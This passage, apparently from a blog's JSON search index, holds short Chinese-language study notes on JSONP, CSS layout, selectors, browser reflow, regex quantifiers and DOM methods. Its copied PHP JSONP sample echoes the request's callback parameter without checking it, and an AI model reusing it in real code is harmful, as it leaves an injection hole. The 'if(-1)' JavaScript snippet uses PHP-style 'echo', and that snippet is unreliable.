小實作","url":"/blog/2016/12/25/logdown/2016-12-25-javascript-jsonp-fruit/","content":"<p>很久之前，有看過JSONP文章，雖然有看一下實作原理都懂，但沒有動手做實作<br>前幾天看到有人討論JSONP不能用POST方法去做<br>這就讓我非常好奇是怎麼一回事<br><a id=\"more\"></a></p>\n<p>首先，<br>先從網路找一份PHP做JSONP範例<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">  &lt;?php</span><br><span class=\"line\"> $fname = $_GET[&apos;firstname&apos;];</span><br><span class=\"line\">         echo $_GET[&apos;callback&apos;] . &apos;(&apos; . &quot;&#123;&apos;fullname&apos; : &apos;Jeff Hansen&apos;&#125;&quot; . &apos;)&apos;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>前端就先用jQuery AJAX實作吧<br>只不過…我真的不太熟<br>一開始就碰壁，不多說馬上筆記</p>\n<p>我很懶，在jQuery官網在開發工具做測試<br>只不過…一直沒成功，讓我好懊腦</p>\n<p>看開發工具好像寫https關係<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&amp;utm_medium=firefox-console-errors&amp;utm_source=mozilla\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&amp;utm_medium=firefox-console-errors&amp;utm_source=mozilla</a></p>\n<p>在http就正常了<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">    $.ajax(&#123;</span><br><span class=\"line\">         type: <span class=\"string\">\"get\"</span>,</span><br><span class=\"line\">         url: <span class=\"string\">\"http://10.10.1.132/testJsonp.php?callback=?&amp;firstname=Jefssf\"</span>,</span><br><span class=\"line\">         dataType: <span class=\"string\">\"jsonp\"</span>,</span><br><span class=\"line\">         <span class=\"comment\">//json: 'callback',</span></span><br><span class=\"line\">         <span class=\"comment\">//jsonpCallback: 'abc',//\"mycallback\"變數的值，沒指定時，jQuery隨機產生</span></span><br><span class=\"line\">         success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">res</span>)</span>&#123;</span><br><span class=\"line\">             <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">         &#125;,</span><br><span class=\"line\">         error: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">             alert(<span class=\"string\">'fail'</span>);</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><code>http://10.10.1.132/testJsonp.php?callback=jQuery1113042020808678791977_1482680736926&amp;firstname=Jefssf&amp;_=1482680736939</code><br>上面網址callback沒有指定的話，產生出來自動為亂數<br>ajax裡的參數 jsonp為 <code>xxx</code>=? 參數命名<br>jsonpCallback=傳回來function命名 ，xxx=<code>?</code>參數，沒指定callback產生出來自動為亂數</p>\n<p>至於JSONP為什麼不能用POST，下次再做探討。</p>\n<p>相關資料<br>JSONP跨網域傳送檔案：以POST方法實作 - 布丁布丁吃什麼？<br><a href=\"http://blog.pulipuli.info/2011/05/jsonppost.html\" target=\"_blank\" rel=\"noopener\">http://blog.pulipuli.info/2011/05/jsonppost.html</a><br>Simple jQuery, PHP and JSONP example? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/6809053/simple-jquery-php-and-jsonp-example\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/6809053/simple-jquery-php-and-jsonp-example</a><br>jQuery.ajax() | jQuery API Documentation<br><a href=\"http://api.jquery.com/jQuery.ajax/\" target=\"_blank\" rel=\"noopener\">http://api.jquery.com/jQuery.ajax/</a><br>success_jsonpCallback<br><a href=\"http://www.cnblogs.com/know/archive/2011/10/09/2204005.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/know/archive/2011/10/09/2204005.html</a><br>Working with JSONP | jQuery Learning Center<br><a href=\"http://learn.jquery.com/ajax/working-with-jsonp/\" target=\"_blank\" rel=\"noopener\">http://learn.jquery.com/ajax/working-with-jsonp/</a><br>混和內容 - Security | MDN<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&amp;utm_medium=firefox-console-errors&amp;utm_source=mozilla\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&amp;utm_medium=firefox-console-errors&amp;utm_source=mozilla</a><br>cross<br><a href=\"http://www.css88.com/jqapi-1.9/jQuery.ajax/\" target=\"_blank\" rel=\"noopener\">http://www.css88.com/jqapi-1.9/jQuery.ajax/</a><br>Attribute Ends With Selector [name$=”value”] | jQuery API中文文档(适用jQuery 1.0 - jQuery 3.0)<br><a href=\"http://www.css88.com/jqapi-1.9/attribute-ends-with-selector/\" target=\"_blank\" rel=\"noopener\">http://www.css88.com/jqapi-1.9/attribute-ends-with-selector/</a><br>使用 JSONP 跨站請求<br><a href=\"http://openhome.cc/Gossip/JavaScript/JSONP.html\" target=\"_blank\" rel=\"noopener\">http://openhome.cc/Gossip/JavaScript/JSONP.html</a></p>\n","categories":["JavaScript"],"tags":["JavaScript","JSONP"]},{"title":"[JavaScript] IE/W3C Event用法大不同","url":"/blog/2017/03/10/logdown/2017-03-10-javascript-ie-w3c-event-uses-different/","content":"<p>整個就悲劇。</p>\n","categories":["JavaScript"]},{"title":"[CSS] margin 排版問題(Collapsing margins)","url":"/blog/2017/03/25/logdown/2017-03-25-1640745/","content":"<p><a href=\"http://geekplux.com/2014/03/14/collapsing_margins.html\" target=\"_blank\" rel=\"noopener\">http://geekplux.com/2014/03/14/collapsing_margins.html</a><br>垂直<br><a href=\"https://read01.com/gm0eN.html\" target=\"_blank\" rel=\"noopener\">https://read01.com/gm0eN.html</a><br>css - Margin collapse on inline-block elements? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/25455932/margin-collapse-on-inline-block-elements\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/25455932/margin-collapse-on-inline-block-elements</a><br>collapsed margin<br><a href=\"http://geekplux.com/2014/03/14/collapsing_margins.html\" target=\"_blank\" rel=\"noopener\">http://geekplux.com/2014/03/14/collapsing_margins.html</a></p>\n<p>inline-block不會有影響<br><code>block只影響上下，左右不會</code><br>先記錄先</p>\n","categories":["CSS"],"tags":["CSS","margin"]},{"title":"[CSS]width:auto不等於100%","url":"/blog/2017/03/25/logdown/2017-03-25-1640260/","content":"<p>最近在公司發現排版有問題，出現不該出現的捲軸<br>CSS原本以為是width:100%，應該調一下box-sizing :border-sizing<br>結果還是一樣有問題….</p>\n<p>後來發現auto，就不會有問題<br>不過當然要思考這兩個屬性差異<br>之後我認為width 沒設就是100%</p>\n<p>但後來Google一下，發現我錯了，預設是auto  (我也以為auto也是100%)</p>\n<blockquote>\n<p>‘margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’ = width of containing block<br><a href=\"http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/\" target=\"_blank\" rel=\"noopener\">http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/</a></p>\n</blockquote>\n<p>身為英文苦手不知道寫什麼意思，後來有爬到中文文章</p>\n<blockquote>\n<p>内容的寬度=’margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’<br>如果’margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’比較大，就減小width的值，如果比較小呢，就增大width的值，使其滿足上面的表達式。</p>\n</blockquote>\n<p><a href=\"http://m.studyofnet.com/news/965.html\" target=\"_blank\" rel=\"noopener\">http://m.studyofnet.com/news/965.html</a></p>\n<p>總結一下，上面意思就是width:auto後，寬度算法會<code>&#39;margin-left&#39; + &#39;border-left-width&#39; + &#39;padding-left&#39; + &#39;padding-right&#39; + &#39;border-right-width&#39; + &#39;margin-right&#39;</code> &gt;<code>width</code>，就會自動<code>縮減</code>width寬度；<code>&#39;margin-left&#39; + &#39;border-left-width&#39; + &#39;padding-left&#39; + &#39;padding-right&#39; + &#39;border-right-width&#39; + &#39;margin-right&#39;</code> &lt;<code>width</code>，就會自動<code>增加</code>width寬度<br>簡單就是width:auto，不會備padding影響<br>正常情行應該選用width:auto比較不會有排版的問題</p>\n<p>參考來源：<br><a href=\"http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/\" target=\"_blank\" rel=\"noopener\">http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/</a><br><a href=\"http://m.studyofnet.com/news/965.html\" target=\"_blank\" rel=\"noopener\">http://m.studyofnet.com/news/965.html</a><br>Visual formatting model details<br><a href=\"https://www.w3.org/TR/CSS21/visudet.html#inline-replaced-width\" target=\"_blank\" rel=\"noopener\">https://www.w3.org/TR/CSS21/visudet.html#inline-replaced-width</a></p>\n","categories":["CSS"],"tags":["CSS","width"]},{"title":"[CSS] checkbox hack 模擬在網頁開視窗","url":"/blog/2017/04/11/logdown/2017-04-11-css-checkbox-hack-simulation-in-a-page-window/","content":"<p><a href=\"http://jsbin.com/hapineqoca/edit?css,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/hapineqoca/edit?css,output</a></p>\n","categories":["CSS"],"tags":["CSS","checkbox hack"]},{"title":"Markdown 編輯器","url":"/blog/2017/04/21/logdown/2017-04-21-1731370/","content":"<p><a href=\"http://www.williamlong.info/archives/4319.html\" target=\"_blank\" rel=\"noopener\">http://www.williamlong.info/archives/4319.html</a></p>\n","categories":["Markdown"]},{"title":"[JavaScript] 網頁渲染的過程 (rendering pipline)","url":"/blog/2017/04/21/logdown/2017-04-21-javascript-web-page-rendering-rendering-pipline/","content":"<p>前幾天在hahow上 <a href=\"https://hahow.in/courses/56189df9df7b3d0b005c6639\" target=\"_blank\" rel=\"noopener\">動畫互動網頁程式入門 (HTML/CSS/JS)</a><br>這沒有要打廣告，不過老師真的教得不錯<br>看到講師上到實作購物車時候<br>其中某一個function利用多個(json)物件組出list清單<br>而新增、刪除都是對物件操作，再透過function把list清單清空再繪製</p>\n<p>！！！！這看起來有問題，講師怎麼這樣做，這項目很多時，捲軸會有問題，這一定有bug<br><a id=\"more\"></a></p>\n<p>不過還是簡單做一個小實驗好了，</p>\n<p><a href=\"http://jsbin.com/fucoxur/edit?html,css,js,console,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/fucoxur/edit?html,css,js,console,output</a><br>結果<br><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t31.0-8/17917730_1726055847411527_4438982537059638344_o.jpg?oh=659fd51996f499d51f9650ab894b273a&amp;oe=5997A193\" alt=\"\"></p>\n<p>怎麼想都想不到原因，就求救FB社群大大求救<br><a href=\"https://www.facebook.com/groups/f2e.tw/permalink/1271697796200916/\" target=\"_blank\" rel=\"noopener\">https://www.facebook.com/groups/f2e.tw/permalink/1271697796200916/</a></p>\n<blockquote>\n<p> 原本網頁渲染的過程 (rendering pipline) 會先執行 js 然後看 dom 跟 cssom 做成 render tree 然後畫在畫面上，你原先的作法等於 dom 被修改了兩次之後瀏覽器才開始跑剩餘的 rendering pipline 的流程 所以會依最後一次的結果 dom 的結果呈現<br>然而你讀取 scrolltop 的屬性的時候 網頁會 reflow 算出 scrolltop 的值，這時瀏覽器就會被強迫進行一次繪製，就會有你原本預期的行為</p>\n</blockquote>\n<p>reflow不知道還有什麼情境，還能運用這個技巧，先記個筆記，怕忘記XD</p>\n<p>參考來源<br><a href=\"https://developers.google.com/web/fundamentals/performance/rendering/\" target=\"_blank\" rel=\"noopener\">https://developers.google.com/web/fundamentals/performance/rendering/</a><br><a href=\"https://gist.github.com/paulirish/5d52fb081b3570c81e3a\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/paulirish/5d52fb081b3570c81e3a</a><br>inspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle</p>\n","categories":["JavaScript"],"tags":["JavaScript","網頁渲染","rendering pipline"]},{"title":"[CSS] 不常用的CSS Selectors筆記","url":"/blog/2017/04/29/logdown/2017-04-29-1767277/","content":"<p>前幾天有用到CSS ~，一直以為跟jQuery的<code>$().siblings()</code>是一樣的東西。<br>結果不是<br>在此記錄一下</p>\n<a id=\"more\"></a>\n<h1 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h1><p>element1+element2</p>\n<blockquote>\n<p>抓取element1下一個<strong>element2</strong>元素</p>\n</blockquote>\n<p>element1~element2</p>\n<blockquote>\n<p>抓取element1之後<strong>element2</strong>元素</p>\n</blockquote>\n<p>[attribute]<br>[attribute~=value]<br>[attribute|=value]</p>\n<blockquote>\n<p><a href=\"https://www.w3schools.com/cssref/sel_attribute_value_lang.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/cssref/sel_attribute_value_lang.asp</a><br>不知道怎麼解譯= =a</p>\n</blockquote>\n<p>[attribute^=value]<br>[attribute$=value]<br>[attribute*=value]<br>:empty<br>抓取標籤無任何東西</p>\n<p>::first-letter<br>::first-line<br>:first-of-type<br>:in-range<br>input 在range內</p>\n<p>:invalid<br>抓取input驗證type屬性不對</p>\n<p>:lang(language)<br>:nth-child(n)<br>:nth-last-child(n)<br>:nth-last-of-type(n)<br>:nth-of-type(n)<br>:target</p>\n<blockquote>\n<p>網址#abc，會對印抓取id=abc<br>jQuery也有此function</p>\n</blockquote>\n<p>—–下面沒有支援jQuery Selector<br>:optional<br>非必填的input</p>\n<p>:out-of-range</p>\n<blockquote>\n<p>input超出 range</p>\n</blockquote>\n<p>:read-only</p>\n<h2 id=\"read-write\"><a href=\"#read-write\" class=\"headerlink\" title=\":read-write\"></a>:read-write</h2><p>::selection</p>\n<blockquote>\n<p>選取文字的顏色</p>\n</blockquote>\n<h1 id=\"jQuery-CSS-Selector沒有\"><a href=\"#jQuery-CSS-Selector沒有\" class=\"headerlink\" title=\"jQuery (CSS Selector沒有)\"></a>jQuery (CSS Selector沒有)</h1><p>整理完才發現這麼多 囧</p>\n<p>:visible Selector<br>:text Selector<br>:target Selector<br>:selected Selector<br>:submit Selector<br>:parent Selector<br>:password Selector<br>:lt() Selector<br>:last Selector<br>:input Selector<br>:image Selector<br>:hidden Selector<br>:header Selector</p>\n<blockquote>\n<p>h1,h2,h3,h4,h5</p>\n</blockquote>\n<p>:has() Selector<br>:first Selector<br>:even Selector<br>:contains() Selector<br>:animated Selector</p>\n","categories":["CSS"],"tags":["CSS","Selectors"]},{"title":"[regex]Greedy quantifier 和 Lazy quantifier 筆記","url":"/blog/2017/04/30/logdown/2017-04-30-1774877/","content":"<p>前幾天在<a href=\"https://www.facebook.com/bosscodingplease/videos/vb.1813913455528733/1842446952675383/?type=3&amp;theater\" target=\"_blank\" rel=\"noopener\">老闆 來點寇汀吧。 Boss,CODING please.</a>製作台灣天氣地圖<br>看到使用正規化抓取href=”.*?”裡面的值</p>\n<p>在此學會新的正規化抓取href裡面值</p>\n<p>Google找到相關文件<br>在此記錄筆記<br><a id=\"more\"></a><br>+——————-+—————–+—————————+<br>| Greedy quantifier | Lazy quantifier |        Description        |<br>+——————-+—————–+—————————+<br>| <em>                 | </em>?              | Match zero or more times. |<br>| +                 | +?              | Match one or more times.  |<br>| ?                 | ??              | Match zero or one time.   |<br>| {n}               | {n}?            | Match exactly n times.    |<br>| {n,}              | {n,}?           | Match at least n times.   |<br>| {n,m}             | {n,m}?          | Match from n to m times.  |<br>+——————-+—————–+—————————+<br><a href=\"http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions#answer-34806154\" target=\"_blank\" rel=\"noopener\">在這邊有找到兩個名詞</a></p>\n<p>原本看不懂這兩個意思<br>不過在這裡面有找到答案<a href=\"http://www.luanxiang.org/blog/archives/36.html\" target=\"_blank\" rel=\"noopener\">一名之立，旬月踟躇</a></p>\n<blockquote>\n<p>正在翻譯《精通正則表達式》，就遇到了這種情況：greedy quantifier控制的子表達式會捕獲儘可能多的匹配字符，lazy quantifier控制的子表達式會捕獲儘可能少的匹配字符。greedy的原意就是「貪婪」，lazy的原意就是「懶惰」，這樣直白地理解，儘管有些彆扭，倒也不成問題。<br>可是，出現greedy和lazy的語境越來越多，直白的翻譯也就越來越不讓人滿意了，「Because of its greediness」，翻譯成「由於它的貪婪性」，簡直無法卒讀。但是，想來想去，實在找不到更好的辦法，總是被「貪」和「懶」兩個字所束縛，這些天，兩本厚厚的英漢詞典，和現代漢語詞典，都快翻盡了，仍然一無所獲。</p>\n</blockquote>\n<blockquote>\n<p>終於在下班的路上想到，不妨另闢蹊徑，索性不出現「貪」和「懶」——greedy翻譯成「多數優先」，lazy翻譯成「少數優先」，反而流暢許多；而且，這樣一來，也不用「性」來「性」去的了，「Because of its greediness」直接翻譯成「因為它是多數優先的」，就OK。</p>\n</blockquote>\n<p>結論</p>\n<p>這個特性真的不錯，平常href=”[^”]+”抓取括號的字，這樣非常簡短。Quantifier在後面加?找最短路徑這樣非常好記<br>學這個小東西，相信regex技能又前進一大步XD</p>\n<p>參考來源<br>Rubular: a Ruby regular expression editor and tester<br><a href=\"http://www.rubular.com/\" target=\"_blank\" rel=\"noopener\">http://www.rubular.com/</a><br>railroad diagram<br><a href=\"https://blog.longwin.com.tw/2013/01/regex-display-tool-2012/\" target=\"_blank\" rel=\"noopener\">https://blog.longwin.com.tw/2013/01/regex-display-tool-2012/</a><br>Railroad Diagrams<br><a href=\"https://regexper.com/documentation.html\" target=\"_blank\" rel=\"noopener\">https://regexper.com/documentation.html</a><br>Quantifiers<br><a href=\"http://www.rexegg.com/regex-quickstart.html\" target=\"_blank\" rel=\"noopener\">http://www.rexegg.com/regex-quickstart.html</a><br>regex - What do lazy and greedy mean in the context of regular expressions? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions</a><br>Logdown<br><a href=\"https://logdown.com/account/posts/1774877/edit\" target=\"_blank\" rel=\"noopener\">https://logdown.com/account/posts/1774877/edit</a><br>[正則表示式 正規表示式 (Regular expression)] 量符(Quantifier)：貪心量符、惰性量符的介紹<br><a href=\"http://notepad.yehyeh.net/Content/Program/RegularExpression/8.php\" target=\"_blank\" rel=\"noopener\">http://notepad.yehyeh.net/Content/Program/RegularExpression/8.php</a><br>Regex Quantifier Tutorial: Greedy, Lazy, Possessive<br><a href=\"http://www.rexegg.com/regex-quantifiers.html#cheat_sheet\" target=\"_blank\" rel=\"noopener\">http://www.rexegg.com/regex-quantifiers.html#cheat_sheet</a><br>Regexper<br><a href=\"https://regexper.com/#href%3D%22(.*%3F)%22\" target=\"_blank\" rel=\"noopener\">https://regexper.com/#href%3D%22(.*%3F)%22</a><br>乱象，印迹 » 一名之立，旬月踟躇<br><a href=\"http://www.luanxiang.org/blog/archives/36.html\" target=\"_blank\" rel=\"noopener\">http://www.luanxiang.org/blog/archives/36.html</a><br>Greedy quantifier<br><a href=\"http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions</a><br>Quantifiers in Regular - Google 搜尋<br><a href=\"https://www.google.com.tw/search?q=Quantifiers+in+Regular&amp;source=lnt&amp;tbs=lr:lang_1zh-CN%7Clang_1zh-TW&amp;lr=lang_zh-CN%7Clang_zh-TW&amp;sa=X&amp;ved=0ahUKEwiAm6WGpsvTAhXCHJQKHVa7Dm0QpwUIHQ&amp;biw=1600&amp;bih=809\" target=\"_blank\" rel=\"noopener\">https://www.google.com.tw/search?q=Quantifiers+in+Regular&amp;source=lnt&amp;tbs=lr:lang_1zh-CN%7Clang_1zh-TW&amp;lr=lang_zh-CN%7Clang_zh-TW&amp;sa=X&amp;ved=0ahUKEwiAm6WGpsvTAhXCHJQKHVa7Dm0QpwUIHQ&amp;biw=1600&amp;bih=809</a></p>\n","categories":["Regex"],"tags":["regex","Greedy quantifier","Lazy quantifier"]},{"title":"[JavaScript]JavaScript原生的找子元素(getElementsByClassName)","url":"/blog/2017/05/01/logdown/2017-05-01-1780467/","content":"<p>最近幫新進同事看code，因為帶他的人是使用JavaScript<br>原本想說盡量使用動態抓取，後來不知道原生怎麼寫<br>結果還是使用 <code>$(&#39;#table&#39;).find(&#39; tr&#39;).size()</code></p>\n<a id=\"more\"></a>\n<p>想說JavaScript應該也是有抓法才對</p>\n<p>就上網找了一下資訊<br>原本以為可以Document.getElementById(‘id’).getElementsByName(‘xxxx’)<br>結果是我錯了orz</p>\n<p>document.getElementById(“intro”);<br>document.getElementsByName()</p>\n<p>Element.getElementsByClassName()<br>Element.getElementsByTagName()</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form name=&apos;form1_name&apos; id=&apos;form1_id&apos;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure>\n<p>document.form1_name;<br>document.forms[‘form1_id’]</p>\n<p>document</p>\n<p><a href=\"https://www.w3schools.com/js/js_htmldom_elements.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/js/js_htmldom_elements.asp</a></p>\n<p>參考來源：<br>JavaScript DOM Elements<br><a href=\"https://www.w3schools.com/js/js_htmldom_elements.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/js/js_htmldom_elements.asp</a><br>document.getElementsByClassName<br><a href=\"https://www.w3schools.com/js/js_htmldom_elements.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/js/js_htmldom_elements.asp</a><br>Element - Web APIs | MDN<br><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Element\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-TW/docs/Web/API/Element</a><br>What’s the point of HTML forms <code>name</code> attribute? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/8946320/whats-the-point-of-html-forms-name-attribute\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/8946320/whats-the-point-of-html-forms-name-attribute</a><br>Element.name - Web APIs | MDN<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Element/name\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/API/Element/name</a><br>DOM Version<br><a href=\"https://www.w3schools.com/jsref/coll_doc_forms.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3schools.com/jsref/coll_doc_forms.asp</a><br>DOM概述 - Web API 接口 | MDN<br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction</a><br>.form1DOM Level<br><a href=\"http://blog.xuite.net/abgne/diary1/5896789-%E5%8F%96%E5%BE%97+HTML+%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/abgne/diary1/5896789-%E5%8F%96%E5%BE%97+HTML+%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0</a><br>DOM Level 要了解嗎 - Google 搜尋<br><a href=\"https://www.google.com.tw/search?q=DOM+Level+%E8%A6%81%E4%BA%86%E8%A7%A3%E5%97%8E&amp;ei=jzcHWcCgIcW10ATyk7-YAw&amp;start=10&amp;sa=N&amp;biw=1600&amp;bih=809\" target=\"_blank\" rel=\"noopener\">https://www.google.com.tw/search?q=DOM+Level+%E8%A6%81%E4%BA%86%E8%A7%A3%E5%97%8E&amp;ei=jzcHWcCgIcW10ATyk7-YAw&amp;start=10&amp;sa=N&amp;biw=1600&amp;bih=809</a><br>JavaScript浏览器对象——表单（Form）<br><a href=\"http://www.monmonkey.com/javascript/liulanqi8.html\" target=\"_blank\" rel=\"noopener\">http://www.monmonkey.com/javascript/liulanqi8.html</a></p>\n","categories":["JavaScript"],"tags":["JavaScript","getElementsByClassName"]},{"title":"[CSS]table td預設是vertical-align: middle???","url":"/blog/2017/05/02/logdown/2017-05-02-1784726/","content":"<p>採到雷</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">thead, tbody,</span><br><span class=\"line\">tfoot           &#123; vertical-align: middle &#125;</span><br><span class=\"line\">td, th, tr      &#123; vertical-align: inherit &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://stackoverflow.com/questions/33487148/default-value-of-vertical-align-for-table-cells\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/33487148/default-value-of-vertical-align-for-table-cells</a><br><a href=\"https://www.w3.org/TR/CSS2/sample.html\" target=\"_blank\" rel=\"noopener\">https://www.w3.org/TR/CSS2/sample.html</a></p>\n","categories":["CSS"],"tags":["CSS","vertical-align"]},{"title":"[CSS] 我的錯誤觀念position:absolute","url":"/blog/2017/05/12/logdown/2017-05-12-css-erroneous-notions-that-i-positionabsolute/","content":"<p>今天做自我介紹排版練習<br>我以前學position:absolute<br>印象以為都以瀏覽器body:左上邊開使算(在沒用  position: relative情況下)<br>但今天做巢狀position:absolute ，排版跟我想排出來的不太一樣<br>在此做筆記</p>\n<p>錯誤的東西吸收很難再做修正<br>在此記錄一些東西，可以回來復習</p>\n<p>資料來源：<br>html - Positioning a nested DIV relative to the page and not the first positioned ancestor - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/36778547/positioning-a-nested-div-relative-to-the-page-and-not-the-first-positioned-ances\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/36778547/positioning-a-nested-div-relative-to-the-page-and-not-the-first-positioned-ances</a></p>\n<p>JS Bin - Collaborative JavaScript Debugging<br><a href=\"http://jsbin.com/jaqogezane/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/jaqogezane/edit?html,css,output</a></p>\n<p>html css基础篇 - 笔记 - 前端网（QDFuns）<br><a href=\"http://www.qdfuns.com/notes.php?mod=view&amp;u=25414&amp;id=f9d7d2e2e25c2bef1eca4db2ed00bae0\" target=\"_blank\" rel=\"noopener\">http://www.qdfuns.com/notes.php?mod=view&amp;u=25414&amp;id=f9d7d2e2e25c2bef1eca4db2ed00bae0</a></p>\n<p>实例演示div+css的绝对定位和相对定位布局 - - ITeye技术网站<br><a href=\"http://xinklabi.iteye.com/blog/1825865\" target=\"_blank\" rel=\"noopener\">http://xinklabi.iteye.com/blog/1825865</a></p>\n<p>实例演示div+css的绝对定位和相对定位 - CSS3知识库<br><a href=\"http://lib.csdn.net/article/css3/51716\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/article/css3/51716</a></p>\n<p>知识库 - 你身边的技术百科全书 - CSDN<br><a href=\"http://lib.csdn.net/home\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/home</a></p>\n<p> CSS3 技能圖</p>\n<p><a href=\"http://lib.csdn.net/base/css3/structure\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/base/css3/structure</a></p>\n<p>知识库 - 你身边的技术百科全书 - CSDN<br><a href=\"http://lib.csdn.net/bases/fd/Software-Develop/ast/frontend#md\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/bases/fd/Software-Develop/ast/frontend#md</a></p>\n<p>CSS3知识库 - 知识库 - 你身边的技术百科全书 - CSDN<br><a href=\"http://lib.csdn.net/base/css3\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/base/css3</a></p>\n<p>AngularJS知识库 - 知识库 - 你身边的技术百科全书 - CSDN<br><a href=\"http://lib.csdn.net/base/angularjs\" target=\"_blank\" rel=\"noopener\">http://lib.csdn.net/base/angularjs</a></p>\n<p>CSDN.NET - 全球最大中文IT社区，为IT专业技术人员提供最全面的信息传播和服务平台<br><a href=\"http://www.csdn.net/?ref=toolbar\" target=\"_blank\" rel=\"noopener\">http://www.csdn.net/?ref=toolbar</a></p>\n","categories":["CSS"],"tags":["CSS","position"]},{"title":"[javascript]if(-1)  結果","url":"/blog/2017/05/15/logdown/2017-05-15-1840469/","content":"<p>遇到一個雷…，記錄一下<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">-1</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(a)&#123;</span><br><span class=\"line\">echo <span class=\"string\">'hello world'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://github.com/denysdovhan/wtfjs\" target=\"_blank\" rel=\"noopener\">denysdovhan/wtfjs: A list of funny and tricky JavaScript examples</a><br><a href=\"https://gist.github.com/MichalZalecki/c964192f830360ce6361\" target=\"_blank\" rel=\"noopener\">wtf.js</a></p>\n","categories":["JavaScript"]},{"title":"[JavaScript]Method definitions(js物件裡function縮寫)","url":"/blog/2017/05/04/logdown/2017-05-04-1790922/","content":"<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">  foo: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* code */</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  bar: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* code */</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td 